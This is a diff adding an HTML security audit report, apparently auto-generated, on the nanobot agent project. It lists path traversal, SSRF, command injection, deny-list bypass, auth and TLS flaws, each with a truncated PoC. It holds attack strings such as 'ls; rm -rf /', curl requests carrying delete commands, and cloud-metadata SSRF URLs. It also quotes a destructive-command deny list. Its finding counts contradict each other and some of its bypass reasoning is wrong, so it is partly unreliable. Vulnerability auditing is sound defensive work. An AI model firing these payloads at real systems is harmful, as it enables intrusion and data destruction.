@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>CodeSentinel 安全审计报告 - nanobot</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 40px; background: #f5f5f5; }
+        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #1a1a2e; border-bottom: 3px solid #e94560; padding-bottom: 10px; }
+        h2 { color: #16213e; margin-top: 30px; }
+        .summary-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 20px 0; }
+        .summary-card { padding: 20px; border-radius: 8px; text-align: center; color: white; }
+        .summary-card h3 { margin: 0; font-size: 2em; }
+        .summary-card p { margin: 5px 0 0; }
+        .vuln-card { background: #f8f9fa; padding: 20px; margin: 15px 0; border-radius: 5px; }
+        pre { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        details { margin-top: 10px; }
+        summary { cursor: pointer; color: #e94560; font-weight: bold; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>CodeSentinel 安全审计报告</h1>
+    <p><strong>项目:</strong> nanobot | <strong>语言:</strong> {"Python": 100.0} | <strong>时间:</strong> 2026-07-12 00:05:04</p>
+
+    <h2>执行摘要</h2>
+    <p>对nanobot项目（https://github.com/HKUDS/nanobot）进行安全审计，发现6个安全漏洞，包括1个严重（Critical）、2个高危（High）、2个中危（Medium）和1个低危（Low）漏洞。主要问题包括：路径遍历漏洞（VULN-9D79C5CD）允许攻击者读取工作目录外的任意文件；SSRF漏洞（VULN-61B2E98C）可被用于内网探测和云服务元数据窃取；命令注入漏洞（VULN-2A42FA3D）允许在沙箱环境中执行任意命令；黑名单过滤绕过漏洞（VULN-D08A4311）可导致任意命令执行；认证绕过漏洞（VULN-E259BD19）使攻击者可以冒充任意用户与bot交互；日志信息泄露漏洞（VULN-20D6C693）可能泄露敏感配对码。建议立即修复严重和高危漏洞，并评估中危漏洞的风险。</p>
+    <p><strong>风险评分:</strong> 85/100</p>
+
+    <div class="summary-grid">
+        <div class="summary-card" style="background:#dc3545;"><h3>2</h3><p>严重</p></div>
+        <div class="summary-card" style="background:#fd7e14;"><h3>8</h3><p>高危</p></div>
+        <div class="summary-card" style="background:#ffc107;color:#333;"><h3>4</h3><p>中危</p></div>
+        <div class="summary-card" style="background:#28a745;"><h3>1</h3><p>低危</p></div>
+    </div>
+
+    <h2>漏洞详情</h2>
+    
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-9D79C5CD - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nanobot/agent/tools/message.py:131</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>def _resolve_media(self, media: list[str]) -&gt; list[str]:
+    resolved: list[str] = []
+    access = current_tool_workspace(
+        self._workspace,
+        restrict_to_workspace=self._restrict_to_workspace,
+    )
+    workspace = access.project_path or self._workspace
+    for p in media:
+        if p.startswith((&quot;http://&quot;, &quot;https://&quot;)):
+            resolved.append(p)
+        elif not access.restrict_to_workspace:
+            path = Path(p).expanduser()
+            resolved.append(p if path.is_absolute() else str(workspace / path))
+        else:
+            resolved.append(str(resolve_workspace_path(p, workspace, access.allowed_root)))
+    return resolved</code></pre>
+                <p><strong>数据流:</strong> 用户通过media参数传入文件路径 -&gt; _resolve_media方法处理路径 -&gt; 当restrict_to_workspace为False时，直接使用Path(p).expanduser()解析路径 -&gt; 如果路径是绝对路径则直接使用，否则拼接workspace路径 -&gt; 返回未充分校验的路径</p>
+                <p><strong>判断理由:</strong> 当restrict_to_workspace为False时，_resolve_media方法对用户输入的media路径仅做了简单的expanduser()展开，没有进行充分的路径规范化校验。攻击者可以通过传入包含&#x27;..&#x27;的路径或符号链接来访问工作目录之外的文件。虽然当restrict_to_workspace为True时会调用resolve_workspace_path进行校验，但默认情况下restrict_to_workspace可能为False，导致路径遍历漏洞。</p>
+                <p><strong>影响分析:</strong> 攻击者可以利用此漏洞读取工作目录之外的任意文件，包括系统配置文件（如/etc/passwd、/etc/shadow）、应用程序配置文件、SSH密钥、数据库凭证等敏感信息。这可能导致进一步的权限提升和横向移动。在严重情况下，攻击者可能获取到整个系统的控制权。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC代码 - 仅供安全研究使用
+漏洞: VULN-9D79C5CD - 路径遍历
+&quot;&quot;&quot;
+
+import requests
+import json
+import sys
+
+# 配置目标服务器
+TARGET_URL = &quot;http://target-server:port/api/message&quot;  # 替换为实际目标URL
+
+# 假设的API调用格式（根据实际接口调整）
+def exploit_path_traversal(target_url, payload_path):
+    &quot;&quot;&quot;
+    利用路径遍历漏洞读取任意文件
+    
+    前置条件:
+    1. MessageTool实例化时 restrict_to_workspace=False (默认值)
+    2. 攻击者可以调用MessageTool的send方法，传入media参数
+    3. 目标系统存在可读的敏感文件
+    &quot;&qu</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-61B2E98C - SSRF</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> nanobot/agent/tools/message.py:131</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>def _resolve_media(self, media: list[str]) -&gt; list[str]:
+    resolved: list[str] = []
+    access = current_tool_workspace(
+        self._workspace,
+        restrict_to_workspace=self._restrict_to_workspace,
+    )
+    workspace = access.project_path or self._workspace
+    for p in media:
+        if p.startswith((&quot;http://&quot;, &quot;https://&quot;)):
+            resolved.append(p)
+        elif not access.restrict_to_workspace:
+            path = Path(p).expanduser()
+            resolved.append(p if path.is_absolute() else str(workspace / path))
+        else:
+            resolved.append(str(resolve_workspace_path(p, workspace, access.allowed_root)))
+    return resolved</code></pre>
+                <p><strong>数据流:</strong> 用户通过media参数传入URL -&gt; _resolve_media方法检查是否以http://或https://开头 -&gt; 直接添加到resolved列表 -&gt; 返回给调用方用于发送消息</p>
+                <p><strong>判断理由:</strong> media参数允许传入http://或https://开头的URL，且没有对URL的目标进行任何校验或白名单过滤。攻击者可以传入内网地址（如http://127.0.0.1:8080/admin）或云服务元数据地址（如http://169.254.169.254/latest/meta-data/），导致SSRF攻击。虽然这些URL最终用于发送消息，但消息发送过程可能会请求这些URL，导致内网探测或敏感信息泄露。</p>
+                <p><strong>影响分析:</strong> 攻击者可以利用此SSRF漏洞进行内网探测、云服务元数据窃取（如AWS临时凭证）、本地服务扫描等。在云环境中，可能导致云服务凭证泄露，进而造成更严重的安全事件。虽然该漏洞评级为medium，但在云原生环境中可能升级为high或critical。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for SSRF vulnerability in MessageTool._resolve_media()
+仅供研究使用 - For research purposes only
+&quot;&quot;&quot;
+
+import requests
+import json
+
+# 目标服务器配置
+TARGET_URL = &quot;http://target-server:port/api/send_message&quot;  # 替换为实际目标
+
+# 攻击payload - 利用media参数进行SSRF
+payloads = {
+    # 1. 探测本地服务
+    &quot;local_services&quot;: [
+        &quot;http://127.0.0.1:8080/admin&quot;,
+        &quot;http://127.0.0.1:3000/status&quot;,
+        &quot;http://localhost:5</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-2A42FA3D - 命令注入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> nanobot/agent/tools/sandbox.py:52</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>args += [&quot;--chdir&quot;, sandbox_cwd,
+        &quot;--&quot;, &quot;sh&quot;, &quot;-c&quot;, command,]</code></pre>
+                <p><strong>数据流:</strong> 用户控制的command参数直接传递给sh -c执行，未经过滤或转义。command参数从外部传入wrap_command函数，最终作为shell命令执行。</p>
+                <p><strong>判断理由:</strong> command参数直接拼接到bwrap的sh -c命令中，虽然使用了shlex.join()对整体参数进行拼接，但command本身作为shell命令字符串执行，攻击者可以通过注入分号、管道符等shell元字符执行任意命令。例如传入&#x27;ls; rm -rf /&#x27;会导致任意命令执行。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者在沙箱环境中执行任意命令。虽然bwrap提供了一定的隔离，但攻击者仍可以：1) 读取沙箱内的敏感文件（如配置文件、用户数据）；2) 修改沙箱内的文件；3) 通过网络外带数据；4) 执行系统命令；5) 可能通过沙箱逃逸漏洞进一步突破隔离。CVSS评分预计为9.8（Critical），因为攻击复杂度低，无需特殊权限，且影响范围广泛。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-2A42FA3D - Command Injection in sandbox.py
+
+仅供研究使用 (For research purposes only)
+&quot;&quot;&quot;
+import shlex
+import subprocess
+import tempfile
+import os
+
+# 模拟漏洞环境
+# 注意：实际利用需要bwrap环境，但PoC展示注入原理
+
+def vulnerable_wrap_command(command, workspace, cwd):
+    &quot;&quot;&quot;模拟漏洞函数&quot;&quot;&quot;
+    ws = workspace
+    sandbox_cwd = cwd
+    
+    args = [
+        &quot;bwrap&quot;, &quot;--new-session&quot;, &quot;--die-with-parent&quot;,
+   </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-D08A4311 - 不安全的黑名单过滤</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nanobot/agent/tools/shell.py:130</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>self.deny_patterns = (deny_patterns or []) + [
+    r&quot;\brm\s+-[rf]{1,2}\b&quot;,
+    r&quot;\bdel\s+/[fq]\b&quot;,
+    r&quot;\brmdir\s+/s\b&quot;,
+    r&quot;(?:^|[;&amp;|]\s*)format(?!=)\b&quot;,
+    r&quot;\b(mkfs|diskpart)\b&quot;,
+    r&quot;\bdd\s+if=&quot;,
+    r&quot;&gt;\s*/dev/sd&quot;,
+    r&quot;\b(shutdown|reboot|poweroff)\b&quot;,
+    r&quot;:\(\)\s*\{.*\};\s*:&quot;,
+    r&quot;&gt;&gt;?\s*\S*(?:history\.jsonl|\.dream_cursor)&quot;]</code></pre>
+                <p><strong>数据流:</strong> 用户输入命令 -&gt; 正则匹配黑名单 -&gt; 执行或拒绝</p>
+                <p><strong>判断理由:</strong> 黑名单过滤模式存在多种绕过方式：1) 使用base64编码命令 2) 使用环境变量拼接 3) 使用通配符替代 4) 使用命令替换 5) 使用不同的shell语法。例如rm -rf可以通过&#x27;rm -r -f&#x27;或&#x27;rm -rf /&#x27;等方式绕过。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致任意命令执行，攻击者可以：1) 读取、修改或删除服务器上的任意文件；2) 执行系统管理命令（如shutdown、reboot）；3) 执行磁盘操作（如dd、mkfs）导致数据丢失；4) 执行fork炸弹等拒绝服务攻击；5) 通过反弹shell等方式获得持久化访问。由于黑名单过滤是唯一的安全检查，绕过后攻击者拥有与shell工具相同的执行权限，可能导致完全的系统控制。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 不安全的黑名单过滤绕过PoC
+# 目标: nanobot/agent/tools/shell.py 第130行黑名单过滤
+
+# 前置条件: 能够通过command或cmd参数向shell工具传递命令
+
+# PoC 1: 使用空格拆分绕过rm -rf检测
+# 黑名单匹配: \brm\s+-[rf]{1,2}\b
+# 绕过: rm -r -f 或 rm -rf --no-preserve-root
+echo &quot;PoC 1: 空格拆分绕过&quot;
+curl -X POST http://target:port/api/execute \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#x27;{&quot;command&quot;: &quot;rm -r -f /tmp/test_dir&quot;}&#x27;
+
+# PoC 2: 使用base64编码绕过
+# 黑名单不匹配编码后的命令
+echo &quot;PoC 2: Base64编码绕过&quot;
+cur</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-E259BD19 - 不安全的认证绕过</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> nanobot/channels/msteams.py:178</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if channel.config.validate_inbound_auth:</code></pre>
+                <p><strong>数据流:</strong> 配置项控制是否验证入站认证</p>
+                <p><strong>判断理由:</strong> validate_inbound_auth配置项允许完全禁用入站认证验证。如果管理员错误地设置为False，任何人都可以向webhook发送消息，冒充任何用户。这是一个严重的安全风险，建议默认启用认证验证。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞后，攻击者可以：
+1. 向 bot 发送任意消息，冒充任何 Teams 用户
+2. 触发 bot 的自动回复功能，可能导致信息泄露
+3. 利用 bot 的功能执行未授权操作（如查询数据、执行命令等）
+4. 如果 bot 有管理员功能，可能导致更严重的安全事件
+5. 发送恶意 payload 尝试进一步攻击 bot 后端系统
+
+此漏洞的严重性为 Critical，因为它完全绕过了身份验证机制，使攻击者能够以任意身份与 bot 交互。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC - 仅供研究使用
+
+利用 nanobot 中 Microsoft Teams 通道的认证绕过漏洞。
+当 validate_inbound_auth 配置项设置为 False 时，
+攻击者可以绕过 Bot Framework 令牌验证，向 webhook 端点发送恶意消息。
+&quot;&quot;&quot;
+
+import json
+import requests
+import sys
+
+# 目标配置
+TARGET_HOST = &quot;http://localhost:3978&quot;  # 默认端口
+TARGET_PATH = &quot;/api/messages&quot;
+
+# 伪造的 Teams 活动消息
+# 参考: https://learn.microsoft.com/en-us/azure/bot-service/rest-api/bot-framework-rest-connector-api-reference?view=azure-bot-service-4.0</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #28a745;">
+                <h3>VULN-20D6C693 - 日志信息泄露</h3>
+                <span class="severity" style="background:#28a745;color:white;padding:2px 8px;border-radius:3px;">LOW</span>
+                <p><strong>文件:</strong> nanobot/pairing/store.py:96</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>logger.info(&quot;Generated pairing code {} for {}@{}&quot;, code, sender_id, channel)</code></pre>
+                <p><strong>数据流:</strong> 配对码生成 -&gt; 记录到日志</p>
+                <p><strong>判断理由:</strong> 配对码被记录到日志中，如果日志文件权限设置不当或被泄露，攻击者可以获取有效的配对码。建议在日志中只记录部分配对码或使用哈希值。</p>
+                <p><strong>影响分析:</strong> 攻击者通过读取日志文件获取完整的配对码，可以在配对码有效期内（默认10分钟）进行未授权配对，从而获得对受保护频道的访问权限。虽然日志泄露本身不直接导致攻击，但结合常见的日志文件权限配置不当、日志轮转未清理、日志被第三方服务收集等场景，攻击者可以获取有效配对码并用于未授权配对。该漏洞违反了最小权限原则，因为配对码作为敏感凭证被完整记录到日志中，没有任何截断、哈希或脱敏处理。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-20D6C693 - 日志信息泄露
+
+仅供安全研究使用！
+
+该PoC演示了如何从日志文件中提取完整的配对码。
+&quot;&quot;&quot;
+
+import re
+import sys
+from pathlib import Path
+
+# 模拟日志文件路径（实际环境中可能位于不同位置）
+LOG_FILE_PATHS = [
+    Path.home() / &quot;.nanobot&quot; / &quot;logs&quot; / &quot;nanobot.log&quot;,
+    Path.home() / &quot;.nanobot&quot; / &quot;nanobot.log&quot;,
+    Path.home() / &quot;.local&quot; / &quot;share&quot; / &quot;nanobot&quot; / &quot;logs&quot; / &quot;nanobot.log&quot;,
+  </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-87563515 - 硬编码凭证/环境变量污染</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nanobot/providers/bedrock_provider.py:60</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if self.api_key:
+    os.environ[&quot;AWS_BEARER_TOKEN_BEDROCK&quot;] = self.api_key</code></pre>
+                <p><strong>数据流:</strong> api_key参数通过构造函数传入 -&gt; 直接写入环境变量os.environ[&quot;AWS_BEARER_TOKEN_BEDROCK&quot;]</p>
+                <p><strong>判断理由:</strong> API密钥被直接写入进程环境变量，这可能导致凭证泄露给子进程或其他能够读取/proc/self/environ的进程。环境变量在进程生命周期内全局可见，增加了凭证被意外泄露的风险。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许同一系统上的其他进程（包括子进程）读取AWS API密钥。具体影响包括：1) 子进程可以继承并泄露凭证；2) 其他进程可以通过/proc/self/environ读取凭证；3) 凭证在进程生命周期内持续存在，增加了泄露窗口；4) 非标准环境变量名称可能导致误用。攻击者可以利用此漏洞获取AWS Bedrock服务的访问权限，可能导致数据泄露、资源滥用等严重后果。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC: 环境变量污染导致凭证泄露
+漏洞ID: VULN-87563515
+仅供安全研究使用 - DO NOT USE FOR ATTACKS
+&quot;&quot;&quot;
+
+import os
+import subprocess
+import sys
+
+# ============================================================
+# PoC 1: 子进程继承泄露凭证
+# ============================================================
+def poc_subprocess_leak():
+    &quot;&quot;&quot;
+    演示：API密钥写入环境变量后，子进程可以读取该凭证。
+    &quot;&quot;&quot;
+    print(&quot;=&quot; * 60)
+    print(&quot;[PoC 1] 子进程继承泄露凭证&quot;)
+    p</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-F7F7E466 - 不安全的SSL证书验证降级</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nanobot/providers/openai_codex_provider.py:78</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>except Exception as e:
+    if &quot;CERTIFICATE_VERIFY_FAILED&quot; not in str(e):
+        raise
+    logger.warning(&quot;SSL verification failed for Codex API; retrying with verify=False&quot;)
+    content, tool_calls, finish_reason, usage, reasoning_content = await _request_codex(
+        DEFAULT_CODEX_URL, headers, body, verify=False,
+        proxy=self.proxy,
+        ...
+    )</code></pre>
+                <p><strong>数据流:</strong> 当SSL证书验证失败时，代码捕获异常并自动降级为verify=False重新请求，这允许中间人攻击者绕过证书验证。</p>
+                <p><strong>判断理由:</strong> 代码在捕获到CERTIFICATE_VERIFY_FAILED异常后，自动将verify参数设置为False并重试请求。这种做法会禁用SSL证书验证，使通信容易受到中间人攻击(MITM)。攻击者可以拦截并篡改与Codex API的通信内容，包括窃取认证令牌和修改请求/响应数据。</p>
+                <p><strong>影响分析:</strong> 攻击者可以完全拦截、查看和修改OpenAI Codex API的所有HTTPS通信。具体影响包括：1) 窃取OAuth认证令牌，可用于冒充用户身份调用API；2) 篡改API请求内容，如降级AI模型、修改输入参数；3) 篡改API响应内容，注入恶意信息或修改AI生成的回复；4) 收集敏感数据，包括用户与AI的对话内容；5) 可能导致供应链攻击，通过修改API响应传播恶意内容。由于漏洞在生产环境中自动触发，无需用户交互，攻击面较大。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC: 不安全的SSL证书验证降级漏洞利用
+漏洞ID: VULN-F7F7E466
+仅供安全研究使用
+
+该PoC演示攻击者如何通过中间人攻击(MITM)拦截并篡改
+OpenAI Codex API的HTTPS通信。
+&quot;&quot;&quot;
+
+import ssl
+import socket
+import threading
+import json
+import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse
+import logging
+
+# 配置日志
+logging.basicConfig(level=logging.INFO, format=&#x27;[MITM] %(message)s&#x27;)
+logger = logging.getLogger(__name__)
+
+# 配置参数
+TARGET_HOST = &quot;chat</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-5B41CD2B - SSRF (Server-Side Request Forgery)</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nanobot/providers/openai_responses/converters.py:72</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>url = (item.get(&quot;image_url&quot;) or {}).get(&quot;url&quot;)
+if url:
+    converted.append({&quot;type&quot;: &quot;input_image&quot;, &quot;image_url&quot;: url, &quot;detail&quot;: &quot;auto&quot;})</code></pre>
+                <p><strong>数据流:</strong> 用户输入通过messages参数传入 -&gt; convert_messages() -&gt; convert_user_message() -&gt; 从image_url中提取url -&gt; 直接传递给input_image的image_url字段 -&gt; 最终可能被下游HTTP客户端用于发起请求</p>
+                <p><strong>判断理由:</strong> 函数convert_user_message从用户提供的消息内容中提取image_url字段的URL值，未进行任何URL验证或白名单检查。该URL随后被放入Responses API的input_image格式中，下游处理程序可能会直接使用该URL发起HTTP请求。攻击者可以提供一个内网地址（如http://169.254.169.254/）或恶意服务器地址，导致SSRF攻击。</p>
+                <p><strong>影响分析:</strong> 成功利用此SSRF漏洞可导致：1) 访问云服务元数据（如AWS/GCP/Azure），获取临时凭证、密钥等敏感信息；2) 探测内部网络服务，发现其他漏洞；3) 读取本地文件（如果支持file://协议）；4) 利用内部服务进行进一步攻击（如Redis未授权访问、数据库等）。影响范围取决于下游HTTP客户端的能力和网络环境。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for SSRF vulnerability in nanobot/providers/openai_responses/converters.py
+Vulnerability ID: VULN-5B41CD2B
+
+仅供研究使用 - 仅用于安全审查和漏洞验证
+&quot;&quot;&quot;
+
+import requests
+import json
+
+# 目标API端点（假设nanobot服务运行在本地或远程）
+TARGET_URL = &quot;http://localhost:8000/v1/chat/completions&quot;  # 根据实际部署调整
+
+# 恶意payload：利用image_url字段进行SSRF攻击
+# 1. 尝试访问云元数据服务（AWS/GCP/Azure）
+# 2. 尝试访问内部服务
+# 3. 尝试访问文件系统（如果支持file://协议）
+
+payloads = [
+    {
+        &quot;role&quot;: &quot;user</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-C7517DF9 - DNS Rebinding Attack Vulnerability</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nanobot/security/network.py:68</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>def resolve_url_target(url: str, *, allow_loopback: bool = False) -&gt; tuple[bool, str, tuple[str, ...]]:
+    ...
+    try:
+        infos = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
+    except socket.gaierror:
+        return False, f&quot;Cannot resolve hostname: {hostname}&quot;, ()
+    ...
+    for addr in addrs:
+        if _is_private(addr):
+            return False, f&quot;Blocked: {hostname} resolves to private/internal address {addr}&quot;, ()</code></pre>
+                <p><strong>数据流:</strong> 用户提供的URL → urlparse() → socket.getaddrinfo() → IP地址验证 → 返回验证结果</p>
+                <p><strong>判断理由:</strong> resolve_url_target函数在验证URL时只进行一次DNS解析。攻击者可以利用DNS rebinding攻击，在第一次解析时返回合法IP通过验证，然后在实际请求时DNS重新解析到内部IP地址。代码没有实现DNS解析结果的缓存和后续请求的IP绑定机制，虽然提供了pin_resolved_url_dns函数，但需要调用方手动使用，存在被绕过的风险。</p>
+                <p><strong>影响分析:</strong> 攻击者可以利用此漏洞绕过SSRF防护，访问内部网络资源。具体影响包括：1) 访问内部Web服务和管理接口；2) 访问云元数据服务（如AWS的169.254.169.254）；3) 访问本地回环服务（127.0.0.1）；4) 可能获取敏感信息或执行内部操作。由于DNS重绑定攻击可以绕过基于IP的访问控制，且不需要其他漏洞配合，危害等级为高。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+DNS Rebinding Attack PoC - 仅供安全研究使用
+
+此PoC演示如何利用nanobot.security.network.resolve_url_target()中的
+单次DNS解析漏洞绕过SSRF防护。
+&quot;&quot;&quot;
+
+import socket
+import threading
+import time
+from urllib.parse import urlparse
+
+# 导入目标库
+from nanobot.security.network import resolve_url_target
+
+# ============================================================
+# 攻击者控制的DNS服务器模拟
+# ============================================================
+
+class MaliciousDNSServer:
+    &quot;&</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-25E5FB47 - TOCTOU Race Condition in DNS Pinning</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nanobot/security/network.py:155</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>@contextmanager
+def pin_resolved_url_dns(url: str, resolved_ips: tuple[str, ...]):
+    ...
+    socket.getaddrinfo = _getaddrinfo
+    try:
+        yield
+    finally:
+        socket.getaddrinfo = original_getaddrinfo</code></pre>
+                <p><strong>数据流:</strong> DNS pinning设置 → 异步操作执行 → DNS pinning恢复</p>
+                <p><strong>判断理由:</strong> pin_resolved_url_dns函数使用contextmanager装饰器，但文档注释明确指出&#x27;Do not use it directly across awaits unless the caller serializes access&#x27;。在异步环境中，如果在yield之后有其他协程执行，可能会修改socket.getaddrinfo，导致DNS pinning被绕过。同时，全局修改socket.getaddrinfo在多线程/多协程环境下存在竞态条件。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致SSRF保护完全失效。攻击者可以：1) 访问云服务metadata端点(如169.254.169.254)获取凭证；2) 扫描内部网络；3) 访问内部服务(数据库、缓存等)；4) 绕过基于IP的访问控制。由于DNS pinning是SSRF防护的关键组件，其绕过意味着所有依赖此机制的防护措施都失效。在云环境中，这可能导致严重的数据泄露和权限提升。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-25E5FB47 - TOCTOU Race Condition in DNS Pinning
+
+仅供研究使用 (For research purposes only)
+
+This proof-of-concept demonstrates how the TOCTOU race condition in
+pin_resolved_url_dns can be exploited to bypass SSRF protection.
+
+The exploit works by:
+1. Starting a legitimate request that triggers DNS pinning
+2. During the pinned window (after yield), racing to change socket.getaddrinfo
+3. Making the subsequent DNS resolution return a malicious intern</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-06C34A23 - 信息泄露</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> nanobot/utils/document.py:72</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>except Exception as e:
+        logger.exception(&quot;Failed to extract PDF {}&quot;, path)
+        return f&quot;[error: failed to extract PDF: {e!s}]&quot;</code></pre>
+                <p><strong>数据流:</strong> 文件读取异常 -&gt; 异常信息包含在返回字符串中</p>
+                <p><strong>判断理由:</strong> 多个_extract_*函数（_extract_pdf、_extract_docx、_extract_xlsx、_extract_pptx、_extract_text_file）都将异常信息直接返回给调用者。异常信息可能包含文件路径、系统信息、库版本等敏感信息，导致信息泄露。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过上传损坏的文档文件（PDF、DOCX、XLSX、PPTX等）来触发异常，从而获取包含敏感信息的异常消息。泄露的信息可能包括：1) 服务器文件系统路径，有助于进一步攻击；2) 库版本信息，可用于识别已知漏洞；3) 内存地址，有助于利用其他内存相关漏洞；4) 系统环境变量，可能包含API密钥、数据库密码等敏感配置；5) 内部应用状态信息。这些信息可以显著降低后续攻击的难度，或直接导致更严重的安全问题。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-06C34A23 - Information Leakage via Exception Messages
+
+仅供研究使用 (For research purposes only)
+
+This PoC demonstrates how exception messages containing sensitive information
+(system paths, library versions, memory addresses, etc.) are leaked through
+the document text extraction functions.
+&quot;&quot;&quot;
+
+import os
+import sys
+import tempfile
+from pathlib import Path
+
+# Add the project root to path for import
+sys.path.insert(0, os.path.dirname</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-1601310C - 信息泄露</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> nanobot/webui/file_preview.py:80</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>return {
+    &quot;path&quot;: str(resolved),
+    &quot;display_path&quot;: display_path,
+    &quot;project_path&quot;: str(scope.project_path),
+    &quot;language&quot;: _language_for_path(resolved),
+    &quot;content&quot;: content,
+    &quot;size&quot;: resolved.stat().st_size,
+    &quot;truncated&quot;: truncated,
+}</code></pre>
+                <p><strong>数据流:</strong> 文件路径直接暴露在响应中</p>
+                <p><strong>判断理由:</strong> 响应中返回了文件的绝对路径（str(resolved)）和项目路径（str(scope.project_path)），这可能会泄露服务器文件系统的目录结构信息。攻击者可以利用这些信息进行更精准的路径遍历攻击或了解服务器配置。</p>
